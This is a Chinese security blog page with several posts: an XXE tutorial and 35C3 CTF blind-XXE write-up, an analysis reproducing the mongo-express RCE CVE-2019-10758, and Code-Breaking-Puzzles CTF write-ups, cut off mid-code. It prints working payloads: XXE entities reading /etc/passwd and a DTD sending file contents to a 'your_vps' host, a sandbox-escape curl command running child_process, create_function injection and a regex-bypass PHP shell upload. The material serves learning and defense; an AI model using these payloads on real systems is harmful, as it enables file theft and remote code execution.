<h1 id="XML相关知识"><a href="#XML相关知识" class="headerlink" title="XML相关知识"></a>XML相关知识</h1><h2 id="什么是XML"><a href="#什么是XML" class="headerlink" title="什么是XML"></a>什么是XML</h2><p>XML被设计为传输和存储数据，其焦点是数据的内容，其把数据从HTML分离，是独立于软件和硬件的信息传输工具。</p>
<p><strong>通俗点来说就是存储数据的一种格式</strong><br><img src="https://i.loli.net/2019/01/06/5c319a94ce60c.jpg" alt><br>它的形式类似于html，都是标签闭合，且有根元素和子元素说法，例如note就是根元素，from和to都是子元素</p>
<h2 id="什么是实体"><a href="#什么是实体" class="headerlink" title="什么是实体"></a>什么是实体</h2><p>实体有以下四种：</p>
<ul>
<li>内置实体 (Built-in entities)</li>
<li>字符实体 (Character entities)</li>
<li>通用实体 (General entities)</li>
<li>参数实体 (Parameter entities)</li>
</ul>
<p><strong>实体根据引用方式，还可分为内部实体与外部实体。</strong>这里简要说一下内部实体和引发XXE漏洞的外部实体、参数实体</p>
<h3 id="内部实体"><a href="#内部实体" class="headerlink" title="内部实体"></a>内部实体</h3><p>即在xml文档中自定义一个实体<br>格式：<code>&lt;!ENTITY 实体名称 &quot;实体的值&quot;&gt;</code>，这是一种引入形式，好比C中引入变量都要声明变量，只不过在XML里引入的不叫变量，而叫做<strong>实体</strong></p>
<p><img src="https://i.loli.net/2019/01/06/5c31a36c41df0.png" alt></p>
<h3 id="外部实体"><a href="#外部实体" class="headerlink" title="外部实体"></a>外部实体</h3><p>格式：<code>&lt;!ENTITY 实体名称 SYSTEM &quot;URI&quot;&gt;</code>，在xml里不给实体赋予具体的值，而是通过某URI引入，叫做外部实体引入</p>
<p>下面是支持使用的URI<br><img src="https://thief.one/upload_image/20170620/1.png" alt></p>
<p>关于外部实体引用file协议的例子如下：</p>
<pre><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;
&lt;!DOCTYPE root [&lt;!ENTITY  file SYSTEM &quot;file:///etc/passwd&quot;&gt;]&gt;
&lt;root&gt;&amp;file;&lt;/root&gt;</code></pre><h3 id="参数实体"><a href="#参数实体" class="headerlink" title="参数实体"></a>参数实体</h3><pre><code>&lt;!ENTITY % 实体名称 &quot;实体的值&quot;&gt;
或者
&lt;!ENTITY % 实体名称 SYSTEM &quot;URI&quot;&gt;</code></pre><p>外部引入参数实体的例子：</p>
<pre><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;
&lt;!DOCTYPE a [
    &lt;!ENTITY % name SYSTEM &quot;file:///etc/passwd&quot;&gt;
    %name;
]&gt;</code></pre><p>注意:%name（参数实体）是<strong>在DTD中被引用</strong>的，而其余实体是在xml文档中被引用的。</p>
<h2 id="什么是DTD"><a href="#什么是DTD" class="headerlink" title="什么是DTD"></a>什么是DTD</h2><p>W3C定义：DTD即文档类型定义（document type define）,可定义合法的XML文档构建模块。它使用一系列合法的元素来定义文档的结构。<br>DTD 可被成行地声明于 XML 文档中，也可作为一个外部引用。</p>
<p>我理解的DTD是构建一个区域，声明在区域中要引入的实体\元素</p>
<h3 id="内部声明DTD"><a href="#内部声明DTD" class="headerlink" title="内部声明DTD"></a>内部声明DTD</h3><p>语法：<code>&lt;!DOCTYPE 根元素 [元素声明]&gt;</code></p>
<p><img src="https://i.loli.net/2019/01/06/5c319fbbd03ee.png" alt></p>
<p>即在xml文档内部用DTD声明：我的根元素是root，在根元素下有to、from这些元素。</p>
<p>其实，你声明的元素和下面的元素名称不对应时也会进行解析。所以我觉得用DTD的用处就是给使用者一个目录栏，为了告诉他们下面的元素结构是什么样子的，而目录栏标题的名字是否正确不做强制要求。</p>
<p><strong>PS：#PCDATA的意思是解析字符数据</strong></p>
<h3 id="外部声明DTD"><a href="#外部声明DTD" class="headerlink" title="外部声明DTD"></a>外部声明DTD</h3><p>语法：<code>&lt;!DOCTYPE 根元素 SYSTEM &quot;文件名&quot;&gt;</code>,即引入外部的dtd声明,其中dtd文件就是引入的实体</p>
<p><img src="https://i.loli.net/2019/01/06/5c31a1a35b693.png" alt></p>
<h1 id="XXE"><a href="#XXE" class="headerlink" title="XXE"></a>XXE</h1><p>XXE漏洞全称XML External Entity Injection即xml外部实体注入漏洞，XXE漏洞发生在应用程序解析XML输入时，没有禁止外部实体的加载，导致可加载恶意外部文件，造成文件读取、命令执行、内网端口扫描、攻击内网网站、发起dos攻击等危害。</p>
<p>上文的外部实体引入部分，可以调用URI来加载数据，这也是造成漏洞点的地方。</p>
<h2 id="有回显的XXE"><a href="#有回显的XXE" class="headerlink" title="有回显的XXE"></a>有回显的XXE</h2><p>jarvisoj平台上的题目</p>
<p>题目描述：请设法获得目标机器/home/ctf/flag.txt中的flag值</p>
<p><img src="https://i.loli.net/2019/01/06/5c31b29f0180e.png" alt></p>
<h2 id="35CTF-Blind-XXE"><a href="#35CTF-Blind-XXE" class="headerlink" title="35CTF Blind XXE"></a>35CTF Blind XXE</h2><p>这个是XXE漏洞能够利用的普遍场景，一般能利用XXE的地方有回显的机率几乎为0。利用blind xxe把数据外带到自己的服务器</p>
<h3 id="代码分析"><a href="#代码分析" class="headerlink" title="代码分析"></a>代码分析</h3><p>代码如下：</p>
<pre><code>&lt;?php
  function __autoload($cls) {
    include $cls;
  }

  class Black {
    public function __construct($string, $default, $keyword, $store) {
      if ($string) ini_set(&quot;highlight.string&quot;, &quot;#0d0d0d&quot;);
      if ($default) ini_set(&quot;highlight.default&quot;, &quot;#0d0d0d&quot;);
      if ($keyword) ini_set(&quot;highlight.keyword&quot;, &quot;#0d0d0d&quot;);

      if ($store) {
            setcookie(&#39;theme&#39;, &quot;Black-&quot;.$string.&quot;-&quot;.$default.&quot;-&quot;.$keyword, 0, &#39;/&#39;);
      }
    }
  }

  class Green {
    public function __construct($string, $default, $keyword, $store) {
      if ($string) ini_set(&quot;highlight.string&quot;, &quot;#00fb00&quot;);
      if ($default) ini_set(&quot;highlight.default&quot;, &quot;#00fb00&quot;);
      if ($keyword) ini_set(&quot;highlight.keyword&quot;, &quot;#00fb00&quot;);

      if ($store) {
            setcookie(&#39;theme&#39;, &quot;Green-&quot;.$string.&quot;-&quot;.$default.&quot;-&quot;.$keyword, 0, &#39;/&#39;);
      }
    }
  }

  if ($_=@$_GET[&#39;theme&#39;]) {
    if (in_array($_, [&quot;Black&quot;, &quot;Green&quot;])) {
      if (@class_exists($_)) {
        ($string = @$_GET[&#39;string&#39;]) || $string = false;
        ($default = @$_GET[&#39;default&#39;]) || $default = false;
        ($keyword = @$_GET[&#39;keyword&#39;]) || $keyword = false;

        new $_($string, $default, $keyword, @$_GET[&#39;store&#39;]);
      }
    }
  } else if ($_=@$_COOKIE[&#39;theme&#39;]) {
    $args = explode(&#39;-&#39;, $_);
    if (class_exists($args[0])) {
      new $args[0]($args[1], $args[2], $args[3], &#39;&#39;);
    }
  } else if ($_=@$_GET[&#39;info&#39;]) {
    phpinfo();
  }

  highlight_file(__FILE__);</code></pre><p>关于代码逻辑部分简单说一下：</p>
<p>theme、string、default、keyword参数决定cookie，如果cookie存在则对cookie的四个参数以“-”号分割处理：把第一部分当作类名、其余三部分当作初始参数进行实例化。</p>
<p>__autoload()方法没什么用，因为php7.2+以后此方法被废弃了，而环境刚好是7.21，所以是出题人用来混淆的。</p>
<p>既然代码没什么可用的类，就看看能不能实例化可以用的php原生类，这里复盘，SimpleXMlElement可用</p>
<p>关于这个类的具体使用介绍：<a href="http://php.net/manual/zh/class.simplexmlelement.php" target="_blank" rel="noopener">http://php.net/manual/zh/class.simplexmlelement.php</a></p>
<p>这里仅仅大致用法：<br><img src="https://upload-images.jianshu.io/upload_images/9113969-80306fef674a47a0.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt></p>
<p><img src="https://upload-images.jianshu.io/upload_images/9113969-8f4614644b563b5f.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt></p>
<p>所以思路就是Blind XXE，让服务器远程解析我们服务器上的xml，获取的数据再次发送到我们的服务器上。</p>
<p>一开始构造xml的poc花了半天时间，主要踩了两个坑：</p>
<p>1、在内部DTD声明中，参数实体不能嵌套参数实体使用，即下方的用法是不允许的，：</p>
<pre><code>&lt;?xml version=&quot;1.0&quot;?&gt;

&lt;!DOCTYPE ANY[

&lt;!ENTITY % file &quot;hpdoger&quot;&gt;
&lt;!ENTITY % send SYSTEM &#39;http://vps/?file=%file;&#39;&gt;

%send;
]&gt;</code></pre><p>只能引入外部声明DTD才能进行<strong>参数实体嵌套使用</strong>，但是嵌套使用还必须满足下面的一个条件</p>
<p>2、 这点是key师傅点播到的：在引入外部DTD声明之后，想要嵌套其它参数实体就必须要用一个“中间参数实体”去搭桥，这个中间参数实体可以理解为eval。具体实现方法看下面的POC</p>
<h3 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h3><p>vps上的xml文件如下：</p>
<pre><code>&lt;?xml version=&quot;1.0&quot;?&gt;

&lt;!DOCTYPE ANY[

&lt;!ENTITY % send SYSTEM &#39;http://your_vps/test2.dtd&#39;&gt;

%send;
%test;
%back;
]&gt;</code></pre><p>vps上的外部DTD声明文件test2.dtd如下：</p>
<pre><code>&lt;!ENTITY % file SYSTEM &quot;php://filter/read=convert.base64-encode/resource=file:///flag&quot;&gt;

&lt;!ENTITY % test &quot;&lt;!ENTITY &amp;#37; back SYSTEM &#39;http://your_vps/?file=%file;&#39;&gt;&quot;&gt;</code></pre><p>用Curl发送请求，–cookie指定请求cookie参数</p>
<pre><code>curl -v --cookie &quot;theme=SimpleXMlElement-http://your_vps/xxe.xml-2-true&quot; &quot;http://35.207.132.47:82&quot;</code></pre><p>查看web日志即能看到base64加密的flag<br><img src="https://i.loli.net/2019/01/06/5c31fa6b43153.png" alt></p>
<p>其中：</p>
<ul>
<li>外部实体send引入外部DTD声明</li>
<li>参数实体test即为“中间参数实体”</li>
<li>&#37;为了避免编码问题</li>
<li>base64-encode是防止文件内容有空格导致http传输时被截断</li>
</ul>
<h1 id="题外话"><a href="#题外话" class="headerlink" title="题外话"></a>题外话</h1><h2 id="关于FUZZ"><a href="#关于FUZZ" class="headerlink" title="关于FUZZ"></a>关于FUZZ</h2><p>关于服务端接收请求，如果已经有lnmp的环境最好。没有的话，这里推荐两个项目：</p>
<ol>
<li><p>TheTwitchy:<a href="https://github.com/TheTwitchy/xxer" target="_blank" rel="noopener">https://github.com/TheTwitchy/xxer</a></p>
</li>
<li><p>docker快速搭建lnmp+ssh(自己的项目求start:):</p>
</li>
</ol>
<p><a href="https://github.com/Hpd0ger/docker-lnmp" target="_blank" rel="noopener">https://github.com/Hpd0ger/docker-lnmp</a></p>
<h2 id="关于XXE漏洞挖掘"><a href="#关于XXE漏洞挖掘" class="headerlink" title="关于XXE漏洞挖掘"></a>关于XXE漏洞挖掘</h2><p>XML作为介质传输流程应该是这样的：</p>
<p>用户传输敏感数据-&gt;xml形式传输-&gt;后端解析xml(loadXML)-&gt;将各DOM节点转化为SimpleXML节点(最终为数组形式，节点名为键名，节点值为键值)-&gt;提取对应节点键值-&gt;数据提取/用户判断</p>
<p>漏洞点就在后端解析xml。</p>
<p>当后端使用<strong>loadXML()</strong>的方法解析xml文档时，会解析恶意xml语句即外部实体的引用，从而造成漏洞。</p>
<p>在挖掘漏洞的时候尤其注意两点：</p>
<ol>
<li>content-type: application/xml</li>
<li>xml形式的数据传输e.g:<code>&lt;user&gt;admin&lt;/user&gt;</code></li>
</ol>
<h2 id="关于防御"><a href="#关于防御" class="headerlink" title="关于防御"></a>关于防御</h2><ol>
<li><p>对于PHP，禁止引用外部实体</p>
<pre><code>libxml_disable_entity_loader(true);</code></pre></li>
<li><p>对于其它语言，其实做好过滤就行了。但是很少见到用xml形式的数据传输了..说多了也没啥用</p>
</li>
</ol>

                
            </div>
            <div class="continue">
            <a href="/2019/01/07/从两道CTF题目学习XXE漏洞/">
            Continue            <i class="fa fa-angle-right" aria-hidden="true"></i>
            </a>
            </div>
        </article>
        
        <article class="post">
            <h1>
                <a class="title" href="/2019/01/03/CVE-2019-10758-mongo-expressRCE复现分析/"> 
                    CVE-2019-10758:mongo-expressRCE复现分析 
                </a>
            </h1>
                        <div class="meta">
                <a class="date"> 
                    <i class="fa fa-calendar" aria-hidden="true"></i>                    
                    2019-01-03   
                </a>
                
                
                
                <a class="tag">
                    <i class="fa fa-tags" aria-hidden="true"></i>  
                </a>
                
                    <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="/tags/代码审计/">代码审计</a></li></ul>
            </div>
            <div class="content">
                
                <h1 id="CVE-2019-10758-mongo-expressRCE复现分析"><a href="#CVE-2019-10758-mongo-expressRCE复现分析" class="headerlink" title="CVE-2019-10758:mongo-expressRCE复现分析"></a>CVE-2019-10758:mongo-expressRCE复现分析</h1><p>早上室友说发了一则mongo-express的预警，正好看到陈师傅也发了twitter，动手分析一下，如有差错还望指正</p>
<h1 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h1><p>漏洞环境:<br><a href="https://github.com/mongo-express/mongo-express#readme" target="_blank" rel="noopener">https://github.com/mongo-express/mongo-express#readme</a><br><a href="https://github.com/masahiro331/CVE-2019-10758" target="_blank" rel="noopener">https://github.com/masahiro331/CVE-2019-10758</a></p>
<p>自己从官方拉到本地+mongodb的服务端或者docker起一个未授权的mongo端都可以，poc直接就能打出来</p>
<pre><code>curl &#39;http://localhost:8081/checkValid&#39; -H &#39;Authorization: Basic YWRtaW46cGFzcw==&#39;  --data &#39;document=this.constructor.constructor(&quot;return process&quot;)().mainModule.require(&quot;child_process&quot;).execSync(&quot;/Applications/Calculator.app/Contents/MacOS/Calculator&quot;)&#39;</code></pre><p><img src="http://static.zybuluo.com/1160307775/1ofxgk12w4566n8105f5s2x9/image_1dto0qppb1f1v124r13mi1rugm8o5q.png" alt="image_1dto0qppb1f1v124r13mi1rugm8o5q.png-386.7kB"></p>
<h1 id="漏洞触发点"><a href="#漏洞触发点" class="headerlink" title="漏洞触发点"></a>漏洞触发点</h1><p>文件<code>express-mongo/node_modules/mongo-express/lib/router.js</code>进行路由事件的方法绑定<br><img src="http://static.zybuluo.com/1160307775/77jhyl9xv7egdf09x00dvdiy/image_1dtnda3rm1r7412s61m5v1i71m5t3p.png" alt="image_1dtnda3rm1r7412s61m5v1i71m5t3p.png-617.2kB"></p>
<p>路由事件checkvalid对应的方法在文件<code>express-mongo/node_modules/mongo-express/lib/routes/document.js</code>，调用了<code>toBSON</code></p>
<p><img src="http://static.zybuluo.com/1160307775/fyz0jsczrxbneolxwpif75fk/image_1dtndcghv1ltvs581mfp1nfr11hu46.png" alt="image_1dtndcghv1ltvs581mfp1nfr11hu46.png-64.8kB"></p>
<p>在toBSON函数中将传入的参数放进vm2沙箱里去eval</p>
<pre><code>exports.toBSON = function (string) {
  var sandbox = exports.getSandbox();

  string = string.replace(/ISODate\(/g, &#39;new ISODate(&#39;);
  string = string.replace(/Binary\((&quot;[^&quot;]+&quot;),/g, &#39;Binary(new Buffer($1, &quot;base64&quot;),&#39;);

  vm.runInNewContext(&#39;doc = eval((&#39; + string + &#39;));&#39;, sandbox);

  return sandbox.doc;
};</code></pre><p>绕一下vm2逃逸出来沙箱即可，详情可以看这篇文章<a href="https://pwnisher.gitlab.io/nodejs/sandbox/2019/02/21/sandboxing-nodejs-is-hard.html" target="_blank" rel="noopener">Sandboxing NodeJS is hard, here is why</a></p>
<h1 id="其他触发点"><a href="#其他触发点" class="headerlink" title="其他触发点"></a>其他触发点</h1><p>还有一处对mongo传值的地方也存在bson的问题，只是要校验是否存在数据库&amp;表名，利用起来没有checkValid的链方便，不过大多数mongo库都会存在local的库+start_log这个collection</p>
<p><img src="http://static.zybuluo.com/1160307775/eb2olwr7s4b04kmrsqhhvo1d/image_1dtr6dtch1t8kgrj1tq4c1jcivm.png" alt="image_1dtr6dtch1t8kgrj1tq4c1jcivm.png-375kB"></p>
<h1 id="需不需要验证"><a href="#需不需要验证" class="headerlink" title="需不需要验证"></a>需不需要验证</h1><p><code>mongo-express</code>把原始config对象写在config.default.js文件中。</p>
<p>漏洞分析中的poc需要进行权限鉴定，也就是poc中使用了请求头<code>Authorization: Basic YWRtaW46cGFzcw==</code>的原因。删掉后请求则会返回未授权</p>
<p><img src="http://static.zybuluo.com/1160307775/diptzrofl46yjfld44z1m025/image_1dto2g2p7kj6121c18ci1h4vq9i77.png" alt="image_1dto2g2p7kj6121c18ci1h4vq9i77.png-63.4kB"></p>
<p>但是如果以cli+指定用户形式启动服务端与mongo的连接时，则不需要授权也能打(个人认为这种方式更常见一点?)<br><img src="http://static.zybuluo.com/1160307775/so63suhp0hmj3thu9axhunmf/image_1du1fiujq1v2r1icnt5t3lctg69.png" alt="image_1du1fiujq1v2r1icnt5t3lctg69.png-524.8kB"></p>
<p>下面是关于mongo-express调用<code>basic-auth-connect</code>的认证简单分析</p>
<h2 id="认证流程分析"><a href="#认证流程分析" class="headerlink" title="认证流程分析"></a>认证流程分析</h2><p>程序入口逻辑是这样的，如果你程序启动的时候给一个-u&amp;-p参数则<code>config.useBasicAuth</code>为false，而<code>config.useBasicAuth</code>在加载配置的阶段默认为true</p>
<pre><code>if (commander.username &amp;&amp; commander.password) {
...
config.useBasicAuth = false;
}</code></pre><p>接着看文件<code>express-mongo/node_modules/mongo-express/lib/router.js</code>，根据<code>config.useBasicAuth</code>的值绑定一个<code>basicAuth</code>中间键，如果初始启动程序的时候没有-u/-p参数，则获取配置文件的username&amp;password(默认为admin:pass)来进行绑定</p>
<p><img src="http://static.zybuluo.com/1160307775/s00s25eqbwv3p7idk9ei0xjs/image_1dtntgtmr1cep1la29dnuaevf45d.png" alt="image_1dtntgtmr1cep1la29dnuaevf45d.png-591kB"></p>
<p>这里假设我们启动程序的时候默认不传入-u/-p，则步入<code>basicAuth</code>函数。这里定义了两个全局变量<code>username</code>&amp;<code>password</code>，来存储配置文件的用户名密码。</p>
<pre><code>module.exports = function basicAuth(callback, realm) {
  var username, password;

  // user / pass strings
  if (&#39;string&#39; == typeof callback) {
    username = callback;
    password = realm;
    if (&#39;string&#39; != typeof password) throw new Error(&#39;password argument required&#39;);
    realm = arguments[2];
    callback = function(user, pass){
      return user == username &amp;&amp; pass == password;
    }
  }

  realm = realm || &#39;Authorization Required&#39;;

  return function(req, res, next) {
    var authorization = req.headers.authorization;

    if (req.user) return next();
    if (!authorization) return unauthorized(res, realm);

    var parts = authorization.split(&#39; &#39;);

    if (parts.length !== 2) return next(error(400));

    var scheme = parts[0]
      , credentials = new Buffer(parts[1], &#39;base64&#39;).toString()
      , index = credentials.indexOf(&#39;:&#39;);

    if (&#39;Basic&#39; != scheme || index &lt; 0) return next(error(400));

    var user = credentials.slice(0, index)
      , pass = credentials.slice(index + 1);

    // async
    if (callback.length &gt;= 3) {
      callback(user, pass, function(err, user){
        if (err || !user)  return unauthorized(res, realm);
        req.user = req.remoteUser = user;
        next();
      });
    // sync
    } else {
      if (callback(user, pass)) {
        req.user = req.remoteUser = user;
        next();
      } else {
        unauthorized(res, realm);
      }
    }
  }
};</code></pre><p>在这之后的所有请求则必须都要有<code>req.headers.authorization</code>，来与全局变量<code>username</code>&amp;<code>password</code>比对进行认证，否则返回Unauthorized。</p>
<p>所以要想不进入<code>basicAuth</code>函数，只需要<code>config.useBasicAuth = false</code></p>
<h2 id="cli启动-未授权"><a href="#cli启动-未授权" class="headerlink" title="cli启动-未授权"></a>cli启动-未授权</h2><p>在mongo-express中还有一种启动方式，即用命令行传递参数。<br><img src="http://static.zybuluo.com/1160307775/ju6aewyf8sm5po3yu3r18urz/image_1dto26qrj1bge18bm6o41o13bn667.png" alt="image_1dto26qrj1bge18bm6o41o13bn667.png-44.5kB"></p>
<p>由于poc中，用docker拉的mongodb默认是未授权的形式，所以不需要-u&amp;-p来指定数据库的账号密码。但是实际环境中mongodb不太可能是未授权，所以我觉得以cli+参数启动服务的场景应该算是多见吧。</p>
<p>那么如果受害者指定了用户名&amp;密码去启动express-mongo，那么攻击者直接未授权就可以打(即不需要指定authoriza header)</p>
<p>不过在官方文档中给出了一句话:</p>
<pre><code>You can use the following environment variables to modify the container&#39;s configuration</code></pre><p>因为config.default.js默认会从环境变量中加载mongodb的用户名&amp;密码，这样无需参数就能启动服务，也顺便避免了未授权的问题</p>
<h1 id="官方修复"><a href="#官方修复" class="headerlink" title="官方修复"></a>官方修复</h1><p><a href="https://github.com/mongo-express/mongo-express/commit/d8c9bda46a204ecba1d35558452685cd0674e6f2" target="_blank" rel="noopener">https://github.com/mongo-express/mongo-express/commit/d8c9bda46a204ecba1d35558452685cd0674e6f2</a></p>
<p>在0.54.0中将bson.js中的vm依赖删除，改用<code>mongo-query-parser</code></p>
<p><img src="http://static.zybuluo.com/1160307775/abenhjn0g17fc8ef5jlgjvd2/image_1dtohg4gq10ehc9k100fbfq11ok8u.png" alt="image_1dtohg4gq10ehc9k100fbfq11ok8u.png-32.5kB"></p>
<h1 id="express分析"><a href="#express分析" class="headerlink" title="express分析"></a>express分析</h1><p>框架流程，使用一堆中间键</p>
<p>然后启动流程就是对中间键的层级调用，具体看这篇文章:<a href="https://shadowwood.me/2016/08/27/2016-08-27-express-origin-code-analysis/" target="_blank" rel="noopener">https://shadowwood.me/2016/08/27/2016-08-27-express-origin-code-analysis/</a></p>
<pre><code>核心的两步:
layer.handle_request(req, res, next);

/*
handle_request定义的就是express应用中的路由中间件请求处理函数，也就是例如app.get(‘/test’, function(req, res, next){})的操作最后的执行位置。
*/

/*
layer.handle_request会执行layer.route的dispatch操作，也就是在Route中派发路由最终执行到在express中定义的对应的路由操作函数，之后又执行next()就又到了这里的proto.stack中的下一个遍历操作。
*/


//handle_request原生是这样写的:

Layer.prototype.handle_request = function handle(req, res, next) {
  var fn = this.handle;

  if (fn.length &gt; 3) {
    // not a standard request handler
    return next();
  }

  try {
    fn(req, res, next);
  } catch (err) {
    next(err);
  }
};
</code></pre>
                
            </div>
            <div class="continue">
            <a href="/2019/01/03/CVE-2019-10758-mongo-expressRCE复现分析/">
            Continue            <i class="fa fa-angle-right" aria-hidden="true"></i>
            </a>
            </div>
        </article>
        
        <article class="post">
            <h1>
                <a class="title" href="/2018/12/21/Code-Breaking-Puzzles WriteUp/"> 
                    Code-Breaking-Puzzles WriteUp 
                </a>
            </h1>
                        <div class="meta">
                <a class="date"> 
                    <i class="fa fa-calendar" aria-hidden="true"></i>                    
                    2018-12-21   
                </a>
                
                
                
                <a class="tag">
                    <i class="fa fa-tags" aria-hidden="true"></i>  
                </a>
                
                    <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="/tags/代码审计/">代码审计</a></li></ul>
            </div>
            <div class="content">
                
                <h1 id="Code-Breaking-Puzzles-WriteUp"><a href="#Code-Breaking-Puzzles-WriteUp" class="headerlink" title="Code-Breaking-Puzzles WriteUp"></a>Code-Breaking-Puzzles WriteUp</h1><p>最近终于可以忙里偷闲来做一下P神的题目，真的能学到不少东西，对底层的一些漏洞知识学习很有帮助。感谢网上已经有好多版本的wp可以提供参考，有一些知识实在是盲区。写一些笔记，不笱求与师傅们观点相异，如果能让看文章的人更能理解这些洞点，也算是我的荣幸了。</p>
<h1 id="easy-function"><a href="#easy-function" class="headerlink" title="easy - function"></a>easy - function</h1><p>不得不说P神的代码简洁又暴力</p>
<pre><code>&lt;?php
$action = $_GET[&#39;action&#39;] ?? &#39;&#39;;
$arg = $_GET[&#39;arg&#39;] ?? &#39;&#39;;

if(preg_match(&#39;/^[a-z0-9_]*$/isD&#39;, $action)) {
    show_source(__FILE__);
} else {
    $action(&#39;&#39;, $arg);
}</code></pre><p>这里??是php7+的用法，<strong>$_GET[‘action’]非空则 $action = $_GET[‘action’]</strong></p>
<p>应该是利用action做函数名来执行命令，但$action的首尾做了正则限制，不能直接是函数名。</p>
<p>P神小密圈说到的方式用\可以绕过。原因就是<strong>\funciton</strong>是php原生函数的写法，就是以命名空间+函数名的方法来表示函数。而原生函数的命名空间是”&quot;。这种用法倒是在tp框架里见过，当调用一个类的时候会指明命名空间”\think\db”。虽然很无感命名空间的说法，但是感觉和java里的package类似</p>
<p>接着就是调用Create_function函数来代码注入了，具体原理参考：<a href="http://blog.51cto.com/lovexm/1743442" target="_blank" rel="noopener">http://blog.51cto.com/lovexm/1743442</a></p>
<p>直接上Poc:<br><code>action=create_function&amp;arg=;}print_r(file_get_contents(&#39;../flag_h0w2execute_arb1trary_c0de&#39;));//</code></p>
<p>别忘了注释//，否则逃脱不了函数</p>
<h1 id="easy-pcrewaf"><a href="#easy-pcrewaf" class="headerlink" title="easy - pcrewaf"></a>easy - pcrewaf</h1><pre><code>&lt;?php
function is_php($data){
    return preg_match(&#39;/&lt;\?.*[(`;?&gt;].*/is&#39;, $data);
}

if(empty($_FILES)) {
    die(show_source(__FILE__));
}

$user_dir = &#39;data/&#39; . md5($_SERVER[&#39;REMOTE_ADDR&#39;]);
$data = file_get_contents($_FILES[&#39;file&#39;][&#39;tmp_name&#39;]);
if (is_php($data)) {
    echo &quot;bad request&quot;;
} else {
    @mkdir($user_dir, 0755);
    $path = $user_dir . &#39;/&#39; . random_int(0, 10) . &#39;.php&#39;;
    move_uploaded_file($_FILES[&#39;file&#39;][&#39;tmp_name&#39;], $path);

    header(&quot;Location: $path&quot;, true, 303);
} </code></pre><h2 id="逻辑"><a href="#逻辑" class="headerlink" title="逻辑"></a>逻辑</h2><p>又是一段粗暴的代码。逻辑很清晰：上传文件-&gt;检测是否包含php语句-&gt;否-&gt;跳转到上传的文件</p>
<p>很明显应该是preg_match的洞点，但是当时并不知道具体突破的思路，看了一些文章才知道，原来php用的是PCRE库的。那么什么是PCRE和NFA正则引擎？</p>
<h2 id="PCRE"><a href="#PCRE" class="headerlink" title="PCRE"></a>PCRE</h2><p>PCRE(Perl Compatible Regular Expressions中文含义：perl语言兼容正则表达式)是一个用C语言编写的正则表达式函数库</p>
<p>NFA引擎</p>
<pre><code>**NFA：从起始状态开始，一个字符一个字符地读取输入串，并与正则表达式进行匹配，如果匹配不上，则进行回溯，尝试其他状态**</code></pre><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>NFA其实就像是用栈的结构来存储匹配成功的字符串，如果匹配不到下一个，则出栈进行上一个字符串匹配。就拿这段正则语句来说</p>
<pre><code>preg_match(&#39;/&lt;\?.*[(`;?&gt;].*/is&#39;, $data)</code></pre><p>如果我们输入<code>&lt;?php print;abcd</code></p>
<p>那么它匹配的流程应该是这样的：<br><code>&lt;?php print;abc</code><br><code>&lt;?php print;ab</code><br><code>&lt;?php print;a</code><br><code>&lt;?php print;</code><br><code>&lt;?php print;abcd</code></p>
<p><strong>.*</strong>会把?后的所有字符都先匹配到，发现没有[]里面的这些字符后再进行回溯。但是PHP为了防止回溯次数过多，发生拒绝服务，会有一个回溯限制</p>
<p>引用kk师傅的一张图：<br><img src="https://www.kingkk.com/2018/11/Code-Breaking-Puzzles-%E9%A2%98%E8%A7%A3-%E5%AD%A6%E4%B9%A0%E7%AF%87/3.png" alt></p>
<p>5.2以后的版本回溯次数是1000000，超过这个次数还没有匹配到，则会返回false</p>
<h2 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h2><p>既然是弱类型比较，我们就用false来等价null绕过</p>
<pre><code>&lt;?php
$f = fopen(&quot;poc.txt&quot;, &quot;w&quot;);
$msg = &quot;&lt;?php print_r(scandir(&#39;../&#39;));?&gt;&quot;.str_repeat(&quot;A&quot;,1000000);
fwrite($f,$msg);
fclose($f);</code></pre><p>构造个上传表单完事</p>
<p>这也提醒我们,正确使用preg_match的重要性，用强类型等于避免很多不安全因素</p>
<h1 id="phpmagic"><a href="#phpmagic" class="headerlink" title="phpmagic"></a>phpmagic</h1><p>这个题真的发现很多知识碎片</p>
<h2 id="php-filter"><a href="#php-filter" class="headerlink" title="php://filter"></a>php://filter</h2><p>首先聊聊filter的妙用。以前见到的情况和套路都是include()、file_get_contents()的参数可控，我们用php://filter/read配合base64-encode可以把文件编码成base64后输出。没想到file_put_contents文件名可控时也有magic</p>
<p>当我们可控的文件名$file传入参数<code>php://filter/write=convert.base64-decode/resource=shell.php</code>，$text传入<code>this is test</code>时，file_put_contents($file,$text)执行的内容如下：<br><img src="https://s1.ax1x.com/2018/12/24/F6Hv60.png" alt></p>
<p>可以把写入的文本进行base64编码，而且可以指定写入的文件名<code>shell.php</code>。其实这个用处还挺多的，比如将可控文本Base64编码，用伪协议写入文件的时候再decode，就能绕过<strong>后端正则对可控文本php危险语句检测</strong>的过滤</p>
<h2 id="审计"><a href="#审计" class="headerlink" title="审计"></a>审计</h2><p>关键代码<br><img src="https://s1.ax1x.com/2018/12/24/F6bp0U.png" alt></p>
<p>$output会被转义后输入到可控文本，用上面的思路在写入文本的时候base64-decode就能绕过，注意用Host拼接$log_name。</p>
<p>至于绕过后缀名，这两天做工程实践的时候恰好用到了p师傅关于apache的x0a后缀解析为php的文件上传绕过，具体思路：<a href="https://github.com/vulhub/vulhub/tree/master/httpd/CVE-2017-15715" target="_blank" rel="noopener">https://github.com/vulhub/vulhub/tree/master/httpd/CVE-2017-15715</a><br><img src="https://s1.ax1x.com/2018/12/24/F6bE11.png" alt></p>
<p>poc如下<br><img src="https://s1.ax1x.com/2018/12/24/F6b97F.png" alt></p>
<h1 id="php-limit"><a href="#php-limit" class="headerlink" title="php limit"></a>php limit</h1><p>这道题依然简单粗暴，代码如下</p>
<pre><code>&lt;?php
if(&#39;;&#39; === preg_replace(&#39;/[^\W]+\((?R)?\)/&#39;, &#39;&#39;, $_GET[&#39;code&#39;])) {    
    eval($_GET[&#39;code&#39;]);
} else {
    show_source(__FILE__);
